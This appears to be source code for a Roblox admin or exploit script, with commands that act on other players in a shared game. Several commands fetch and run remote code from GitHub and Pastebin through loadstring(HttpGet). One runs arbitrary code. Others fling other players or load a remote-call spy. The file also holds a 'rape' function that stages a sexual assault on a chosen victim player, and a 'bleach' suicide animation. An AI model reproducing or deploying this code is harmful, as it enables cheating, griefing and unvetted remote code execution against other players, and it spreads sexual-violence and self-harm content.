for _, plr in pairs(gPlayers:GetChildren()) do
    if plr.ClassName == "Player" then
        updateevents(plr) ChatLog(plr) end end
_players.PlayerAdded:connect(function(player)
	updateevents(player) ChatLog(player)
end)
_G.exec_cmd = execCmd
--gPlayers.LocalPlayer.Chatted:connect(doexec)
function GLS(lower, start) local AA = '' for i,v in pairs(cargs) do if i > start then if AA ~= '' then AA = AA .. ' ' .. v else AA = AA .. v end end end if not lower then return AA else return string.lower(AA) end end
local _char=function(plr_name)
    for i,v in pairs(gPlayers:GetChildren())do
        if v:IsA'Player'then
            if v.Name==plr_name then return v.Character end
        end
    end
    return
end
local _plr=function(plr_name)
    for i,v in pairs(gPlayers:GetChildren())do
        if v:IsA'Player'then
            if v.Name==plr_name then return v end
        end
    end
    return
end
function addcmd(name,desc,alias,func)
    cmds[#cmds+1]=
    {
        NAME=name;
        DESC=desc;
        ALIAS=alias;
        FUNC=func;
    }
end
SPC = {'all', 'others', 'random', 'allies', 'enemies', 'team', 'nonteam', 'friends', 'nonfriends', 'admins', 'nonadmins','bacons'}
local SpecialPlayerCases = {
	["all"] = function(speaker)return game:GetService("Players"):GetPlayers() end,
	["others"] = function(speaker)
		local plrs = {}
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v ~= speaker then
				table.insert(plrs,v)
			end
		end
		return plrs
	 end,
	["me"] = function(speaker)return {speaker} end,
	["#(%d+)"] = function(speaker,args,currentList)
		local returns = {}
		local randAmount = tonumber(args[1])
		local players = {unpack(currentList)}
		for i = 1,randAmount do
			if #players == 0 then break end
			local randIndex = math.random(1,#players)
			table.insert(returns,players[randIndex])
			table.remove(players,randIndex)
		end
		return returns
	end,
	["random"] = function(speaker,args,currentList)
		local players = currentList
		return {players[math.random(1,#players)]}
	end,
	["%%(.+)"] = function(speaker,args) -- This is team Ex:[;kill %green]
		local returns = {}
		local team = args[1]
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["allies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["enemies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["team"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonteam"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["friends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
									if SafeIsFriendsWith(plr, speaker.UserId) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonfriends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
						if not SafeIsFriendsWith(plr, speaker.UserId) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["guests"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Guest then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["bacons"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["admins"] = function(speaker)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if isAdmin(plr) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonadmins"] = function(speaker)
		local returns = {}
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if not isAdmin(plr) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["age(%d+)"] = function(speaker,args)
		local returns = {}
		local age = tonumber(args[1])
		if not age == nil then return end
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
		if plr.AccountAge <= age then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["rad(%d+)"] = function(speaker,args)
		local returns = {}
		local radius = tonumber(args[1])
		local speakerChar = speaker.Character
		if not speakerChar or not speakerChar:FindFirstChild("HumanoidRootPart") then return end
		for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local magnitude = (plr.Character:FindFirstChild("HumanoidRootPart").Position-speakerChar.HumanoidRootPart.Position).magnitude
				if magnitude <= radius then table.insert(returns,plr) end
			end
		end
		return returns
	end
}
local function toTokens(str)
	local tokens = {}
	for op,name in string.gmatch(str,"([+-])([^+-]+)") do
		table.insert(tokens,{Operator = op,Name = name})
	end
	return tokens
end
local function onlyIncludeInTable(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end
local function removeTableMatches(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end
local function getPlayersByName(name)
	local found = {}
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
				if string.sub(string.lower(v.Name),1,#name) == string.lower(name)
		        or string.sub(string.lower(v.DisplayName),1,#name) == string.lower(name) then
			table.insert(found,v)
		end
	end
	return found
end
local function getPlayer(list,speaker)
	if list == nil then return {speaker.Name} end
	local nameList = splitString(list,",")
	
	local foundList = {}
	
	for _,name in pairs(nameList) do
		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
		local tokens = toTokens(name)
		local initialPlayers = game:GetService("Players"):GetPlayers()
		
		for i,v in pairs(tokens) do
			if v.Operator == "+" then
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
				end
			else
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
				end
			end
		end
		
		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
	end
	
	local foundNames = {}
	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
	
	return foundNames
end
function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
	local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
	if (zCoco) then
		funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
	else
		funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
	end
	return funcw
end
function _G.msg(txt)
	spawn(function()
	msghook()
	if MSGhook == true then
	workspace.IYmessage.Text = ''
	wait(0.1)
	local b = Instance.new("BlurEffect", LightingService)
	b.Name = "IYmblur"
    b.Size = 18
	workspace.IYmessage.Text = txt
	wait(Mseconds)
	b:Destroy()
	if workspace.IYmessage.Text == txt then
	workspace.IYmessage.Text = '' end
	elseif MSGhook == false then
	execCmd("loadm")
	repeat wait() until workspace:FindFirstChild("IYmessage")
	workspace.IYmessage.Text = ''
	wait(0.1)
	local b = Instance.new("BlurEffect", LightingService)
	b.Name = "IYmblur"
    b.Size = 18
	workspace.IYmessage.Text = txt
	wait(Mseconds)
	b:Destroy()
	if workspace.IYmessage.Text == txt then
	workspace.IYmessage.Text = '' end
	end
end)
end
function bleach(plr)
spawn(function()
local char = plr.Character
local hit1 = Instance.new("Sound", workspace)
hit1.SoundId = "http://roblox.com/asset?id=145486953"
local hit = Instance.new("Sound", workspace)
hit.SoundId = "http://roblox.com/asset?id=178646271"
local Bleach = Instance.new("Part", char["Left Arm"])
Bleach.CanCollide = false
local Mesh = Instance.new("SpecialMesh", Bleach)
Mesh.MeshId = "http://roblox.com/asset?id=483388971"
Mesh.Scale = Vector3.new(0.005, 0.005, 0.005)
Mesh.TextureId = "http://roblox.com/asset?id=520016684"
local Handy = Instance.new("Weld", Bleach)
Handy.Part0 = Bleach
Handy.Part1 = char["Left Arm"]
Handy.C0 = CFrame.new(0.5,1.8,0)
Handy.C1 = CFrame.Angles(0,4,1)
local drink = Instance.new("Sound", char.Head)
drink.SoundId = "http://roblox.com/asset?id=10722059"
wait(3)
        game.Chat:Chat(char.Head,"I need to die","Red")
        for i = 1,10 do
            wait()
            char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(-0.018,0,0)
            Handy.C0 = Handy.C0 * CFrame.new(-0.05,-0.07,0.09)
            Handy.C0 = Handy.C0 * CFrame.Angles(0.12,0,0)
            char.Torso["Left Shoulder"].C0 = char.Torso["Left Shoulder"].C0 * CFrame.Angles(0.2,0,-0.1)
        end
        drink:Play()
        wait(3.4)
        drink:Stop()
        for i = 1,10 do
            wait()
            char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.new(0,-0.50,0)
            char.HumanoidRootPart.RootJoint.C0 = char.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(0.175,0,0)
            Handy.C0 = Handy.C0 * CFrame.new(0.05,0.07,-0.09)
            Handy.C0 = Handy.C0 * CFrame.Angles(-0.1,0,0)
            char.Torso["Left Shoulder"].C0 = char.Torso["Left Shoulder"].C0 * CFrame.Angles(-0.15,-0.04,0.2)
            char.Torso["Right Shoulder"].C0 = char.Torso["Right Shoulder"].C0 * CFrame.Angles(-0.05,0.03,0)
            char.Torso["Right Hip"].C0 = char.Torso["Right Hip"].C0 * CFrame.Angles(-0.02,0,0)
            char.Torso["Left Hip"].C0 = char.Torso["Left Hip"].C0 * CFrame.Angles(-0.01,0,0)
        end
        wait(0.01)
        char.Torso.Anchored = true
        char["Left Arm"].Anchored = true
        char["Right Arm"].Anchored = true
        char["Left Leg"].Anchored = true
        char["Right Leg"].Anchored = true
        char.Head.Anchored = true
        hit:Play()
        hit1:Play()
        wait(4)
        local bl00d = Instance.new("Part", char.Head)
        bl00d.Size = Vector3.new(0.1,0.1,0.1)
        bl00d.Rotation = Vector3.new(0,0,-90)
        bl00d.CanCollide = false
        bl00d.Anchored = true
        bl00d.BrickColor = BrickColor.new("Maroon")
        bl00d.Position = char.Head.Position
        bl00d.CFrame = bl00d.CFrame * CFrame.new(0.43,-0.65,0)
        bl00d.Shape = "Cylinder"
        bl00d.Material = "Pebble"
        for i = 1,100 do
            wait()
            bl00d.Size = bl00d.Size + Vector3.new(0,0.05,0.05)
        end
        wait(1)
        char.Humanoid.Health = 0
end)
end
function rape(victim, speaker) -- from rocky2u cmdscript
	spawn(function()
		local P1 = game:GetService("Players")[speaker].Character.Torso
		local V1 = game:GetService("Players")[victim].Character.Torso
		V1.Parent.Humanoid.PlatformStand = true
		P1['Left Shoulder']:destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
		P1['Right Shoulder']:destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
		V1['Left Shoulder']:destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
		V1['Right Shoulder']:destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
		V1['Left Hip']:destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
		V1['Right Hip']:destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'
		local D = Instance.new('Part', P1) D.TopSurface = 0 D.BottomSurface = 0 D.CanCollide = false D.BrickColor = BrickColor.new('Pastel brown') D.Shape = 'Ball' D.Size = Vector3.new(1, 1, 1)
		local DM1 = Instance.new('SpecialMesh', D) DM1.MeshType = 'Sphere' DM1.Scale = Vector3.new(0.4, 0.4, 0.4)
		fWeld('weld', P1, P1, D, true, -0.2, -1.3, -0.6, 0, 0, 0)
		local D2 = D:Clone() D2.Parent = P1
		fWeld('weld', P1, P1, D2, true, 0.2, -1.3, -0.6, 0, 0, 0)
		local C = Instance.new('Part', P1) C.TopSurface = 0 C.BottomSurface = 0 C.CanCollide = false C.BrickColor = BrickColor.new('Pastel brown') C.Size = Vector3.new(0.4, 1.3, 0.4)
		fWeld('weld', P1, P1, C, true, 0, -1, -0.52 + (-C.Size.y / 2), math.rad(-80), 0, 0)
		local C2 = D:Clone() C2.BrickColor = BrickColor.new('Pink') C2.Mesh.Scale = Vector3.new(0.4, 0.62, 0.4) C2.Parent = P1
		fWeld('weld', C, C, C2, true, 0, 0 + (C.Size.y / 2), 0, math.rad(-10), 0, 0)
		local CM = Instance.new('CylinderMesh', C)
		local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.BrickColor = BrickColor.new('Pastel brown') BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
		local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
		fWeld('weld', V1, V1, BL, true, -0.5, 0.5, -0.6, 0, 0, 0)
		local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.BrickColor = BrickColor.new('Pastel brown') BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
		local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
		fWeld('weld', V1, V1, BR, true, 0.5, 0.5, -0.6, 0, 0, 0)
		local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
		local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
		fWeld('weld', V1, V1, BLN, true, -0.5, 0.5, -1.2, 0, 0, 0)
		local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
		local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
		fWeld('weld', V1, V1, BRN, true, 0.5, 0.5, -1.2, 0, 0, 0)
		LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
		LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
		LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)
		if P1:FindFirstChild('weldx') then P1.weldx:destroy() end
		WE = fWeld('weldx', P1, P1, V1, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)
		local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
	end)
	spawn(function() while wait() do for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, -0.3, 0) end for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, 0.3, 0) end end end)
end

addcmd('addalias','Adds an alias to a command',{},
function(args,speaker)
    if #args < 2 then return end
    local cmd = string.lower(args[1])
    local alias = string.lower(args[2])
    for i,v in pairs(cmds) do
        if v.NAME:lower()==cmd or std.inTable(v.ALIAS,cmd) then
            customAlias[alias] = v
			if not aliasSave or aliasSave == nil then aliasSave = {} end
			aliasSave[#aliasSave + 1] = {CMD = cmd, ALIAS = alias}
            Notify("Added "..alias.." as an alias to "..cmd)
			updatefile()
			updatealiases()
            break
        end
    end
end)

addcmd('utf','untouchfling',{},
function(args, speaker)
    getgenv()._touchFlingActive = false

    if notify then
        notify("TouchFling", "TouchFling disabled.")
    end
end)

addcmd('tf','touchfling',{},
function(args, speaker)
    local player = game:GetService("Players").LocalPlayer
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    -- Stop any existing fling before starting a new one
    if getgenv()._touchFlingActive then
        getgenv()._touchFlingActive = false
        task.wait(0.1)
    end

    getgenv()._touchFlingActive = true

    task.spawn(function()
        local RunService = game:GetService("RunService")
        local movel = 0.1

        while getgenv()._touchFlingActive do
            RunService.Heartbeat:Wait()
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")

            if root then
                local vel = root.Velocity
                root.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
                RunService.RenderStepped:Wait()
                root.Velocity = vel
                RunService.Stepped:Wait()
                root.Velocity = vel + Vector3.new(0, movel, 0)
                movel = -movel
            end
        end
    end)

    -- Notify user
    if notify then
        notify("TouchFling", "TouchFling enabled — touch players to fling them.")
    end
end)

addcmd('877241loadalias','dab',{},
function(args,speaker)
    if #args < 2 then return end
    local cmd = string.lower(args[1])
    local alias = string.lower(args[2])
    for i,v in pairs(cmds) do
        if v.NAME:lower()==cmd or std.inTable(v.ALIAS,cmd) then
            customAlias[alias] = v
			updatealiases()
            break
        end
    end
end)

addcmd('removealias','Removes a custom alias',{},
function(args,speaker)
    if #args < 1 then return end
    local alias = string.lower(args[1])
    if customAlias[alias] then
        local cmd = customAlias[alias].NAME
        customAlias[alias] = nil
		for i,v in pairs(aliasSave) do
		if v.ALIAS == tostring(alias) then
		table.remove(aliasSave, i)
		end end
        Notify("Removed the alias "..alias.." from "..cmd)
		updatefile()
		updatealiases()
    end
end)

addcmd('clraliases','Removes all custom alias',{},
function(args,speaker)
customAlias = {}
aliasSave ={}
updatefile()
updatealiases()
Notify('Removed all aliases')
end)

addcmd('s','runs a script in the chat or cmdbar',{'script'},
function(args, speaker)
loadstring(tostring(GLS(false, 0)))()
end)

function hub()
if not game.CoreGui:FindFirstChild('ScriptHub') then
loadstring(game:HttpGet("https://raw.githubusercontent.com/diwrkish/fixed-scripts/refs/heads/main/iy%20fd%20script%20hub.lua"))() end end
addcmd('hub','opens script hub',{'scripts'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
hub()
end end)

addcmd('ff','gives ff to player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        Instance.new("ForceField", pchar)
    end
end)

addcmd('maxhealth','sets a limit of health to player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
		pchar.Humanoid.MaxHealth = args[2]
    end
end)

addcmd('sethealth','sets the health of a player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        pchar.Humanoid.Health = args[2]
    end
end)

addcmd('cspy', 'loads Cobalt Spy', {'cspy'},
function(args, speaker)
    if speaker.userId ~= LP.userId then
        lponly(speaker)
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Wortexios/CobaltSpy/refs/heads/main/Cobalt"))()
    end
end)

addcmd('breakloops','stops any cmd loops',{'break'},
function(args, speaker)
lastBreakTime = tick()
end)

addcmd('invisibleff','gives invisible ff to player',{'invisff'},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
local pchar=_char(v)
local invisff = Instance.new("ForceField", pchar)
invisff.Visible = false
end
end)

addcmd('rocket','attaches a player to a rocket',{'missile'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        spawn(function()
		local m = missile:Clone()
		m.Parent = workspace
		local W = Instance.new('Weld', m)
		W.Part0 = W.Parent
		W.Part1 = pchar.HumanoidRootPart
		W.C1 = CFrame.new(0, 0.5, 1)
		m.force.Force = Vector3.new(0, 15000, 0)
		wait(0.01)
		pchar.HumanoidRootPart.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
		wait(5)
		Instance.new('Explosion', m).Position = m.Position
		wait(0.01)
		pchar:BreakJoints()
		wait(1)
		m:destroy()
		end)
    end
end)

addcmd('kidnap', 'Kidnaps the player in a candy van',{}, function(args, speaker) 
	local players = getPlayer(args[1], speaker)
	if not game:GetService("CoreGui"):FindFirstChild('VanEvent') then
		loadstring(game:HttpGet(('https://pastebin.com/raw/NbY247zv'),true))()
	end
	for i,v in pairs(players) do 
		game:GetService("CoreGui").VanEvent:Fire(gPlayers[v]) 
	end 
end)

addcmd('rejoin','makes you rejoin the game',{'rj'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
game:GetService('TeleportService'):Teleport(game.PlaceId)
end
end)

addcmd('unff', 'takes away ff from player',{'noff'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        local pchar=_char(v)
        for j,v1 in pairs(pchar:GetChildren()) do
			if v1:IsA("ForceField") then
				v1:Destroy()
			end
		end
    end
end)

addcmd('flashlight', 'gives a player a flashlight',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	local flashlight = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01679418710")
	flashlight.Parent = gPlayers[v].Backpack
	flashlight.Name = "IYflashlight"
	end)
	end
end)

addcmd('car', 'inserts a car',{'vehicle'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
	local pchar=_char(v)
	local model = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01172688590")
	model.Parent = workspace
	model:MakeJoints()
	model:MoveTo(pchar.HumanoidRootPart.Position + Vector3.new(5, 5, 0))
	model.Name = "IYcar" .. gPlayers[v].Name wait(0.2)
	for _, child in pairs( model:GetChildren()) do
    if child.ClassName == "Part" then
	child.Anchored = true
	wait(1)
	child.Anchored = false
end end end) end end)

addcmd('uncar', 'removes a players car',{'unvehicle','nocar','novehicle'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	for _, child in pairs( workspace:GetChildren()) do
    if child.Name == "IYcar" .. gPlayers[v].Name then
    child:Destroy()
    end
end
end
end)

addcmd('team','team [plr] [team]',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	local teamname = nil
    for i,v in pairs(players)do
		for a,b in pairs(game.Teams:GetChildren()) do local L_name = b.Name:lower() local F = L_name:find(GLS(true, 1)) if F == 1 then teamname = b end end
			_players[v].Team = teamname
	end
end)

addcmd('maxzoom','maximum camera zoom',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	_players[v].CameraMaxZoomDistance = args[2]
	end
end)

function spawnrain(mesh,texture)
spawn(function()
for i,v in pairs(gPlayers:GetChildren()) do
if v.Character ~= nil and v.Character:FindFirstChild('HumanoidRootPart') then
if raining == true then
local rain = Instance.new("Part",workspace)
rain.CanCollide = true
local m = Instance.new("SpecialMesh",rain)
m.MeshId = "http://www.roblox.com/asset/?id="..mesh
m.TextureId = "http://www.roblox.com/asset/?id="..texture
rain.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-250,250),100,math.random(-250,250))
wait(5) rain:Destroy()
end
end
end
end)
end

raining = false
addcmd('rain','make it rain a mesh',{},
function(args, speaker)
raining = true
repeat
wait(0.5)
spawnrain(args[1],args[2])
until raining == false
end)

addcmd('norain','make it rain a mesh',{'unrain'},
function(args, speaker)
raining = false
end)

local rad = math.rad
addcmd('earthquake','earthquake [power] [intensity]',{}, -- credit to DontAddMeh
function(args, speaker)
     for i = 1,args[1] do
         wait()
                local function ear(instance)
                for i,v in pairs(instance:GetChildren())do
                if v:IsA("Part") then
        if v.Size.x > 1 then
        v.CFrame = CFrame.new(v.Position) * CFrame.Angles(rad(math.random(-args[2],args[2])),rad(math.random(-args[2],args[2])),rad(math.random(-args[2],args[2])))
        end end ear(v) end end ear(workspace)
     end
end)

addcmd('cape','Gives the target player(s) a cape',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
		if _char(v):FindFirstChild("Humanoid") then
			local plr = _players[v]
			repeat wait() until plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
			local torso = plr.Character.HumanoidRootPart
			local p = Instance.new("Part", torso.Parent) p.Name = "IYcape" p.Anchored = false
			p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0
			if not args[2] then
			p.Color = Color3.new(0,0,0)
			p.Color = Color3.new(0,0,0) else
			p.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
			p.Color = Color3.fromRGB((args[2]),(args[3]),(args[4])) end
			p.formFactor = "Custom"
			p.Size = Vector3.new(.2,.2,.2)
			local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
			local motor1 = Instance.new("Motor", p)
			motor1.Part0 = p
			motor1.Part1 = torso
			motor1.MaxVelocity = .01
			motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
			motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
			local wave = false
			repeat wait(1/44)
			local ang = 0.1
			local oldmag = torso.Velocity.magnitude
			local mv = .002
			if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
			ang = ang + math.min(torso.Velocity.magnitude/11, .5)
			motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
			motor1.DesiredAngle = -ang
			if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
			repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
			if torso.Velocity.magnitude < .1 then wait(.1) end
			until not p or p.Parent ~= torso.Parent
		end
	end)
	end
end)

addcmd('uncape','Removes cape',{'nocape'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	local pchar=_char(v)
	for _, child in pairs( pchar:GetChildren()) do
    if child.Name == "IYcape" then
        child:Destroy() end end
	end
end)

addcmd('spasm','makes someone c r a z y',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	local pchar=_char(v)
   local AnimationId = "33796059"
   local Anim = Instance.new("Animation")
   Anim.AnimationId = "rbxassetid://"..AnimationId
   local k = pchar.Humanoid:LoadAnimation(Anim)
   k:Play()
   k:AdjustSpeed(99)
    end
end)

addcmd('dance','makes someone d a n c e',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	local pchar=_char(v)
		local anim = nil		
		local dance1 = math.random(1,7)
		if dance1 == 1 then
		anim = '27789359'
		end
		if dance1 == 2 then
		anim = '30196114'
		end
		if dance1 == 3 then
		anim = '248263260'
		end
		if dance1 == 4 then
		anim = '45834924'
		end
		if dance1 == 5 then
		anim = '33796059'
		end
		if dance1 == 6 then
		anim = '28488254'
		end
		if dance1 == 7 then
		anim = '52155728'
		end
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://"..anim
		local animTrack = pchar.Humanoid:LoadAnimation(animation)
		animTrack:Play()
    end
end)

addcmd('plrsound','creates a sound inside of someone',{'playersound'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	if not args[1] and args[2] then return end
	local pchar=_char(v)
	for _, child in pairs( pchar:GetDescendants()) do
    if child.ClassName == "Sound" then
    child:Destroy() end end
	local s = Instance.new("Sound")
	s.Name = "IYplrsound"
	s.SoundId = "http://www.roblox.com/asset/?id=" .. args[2]
	s.Volume = 1
	s.Pitch = 1
	s.Looped = true
	s.archivable = true
	s.Parent = pchar.HumanoidRootPart
	s:Play()
    end
end)

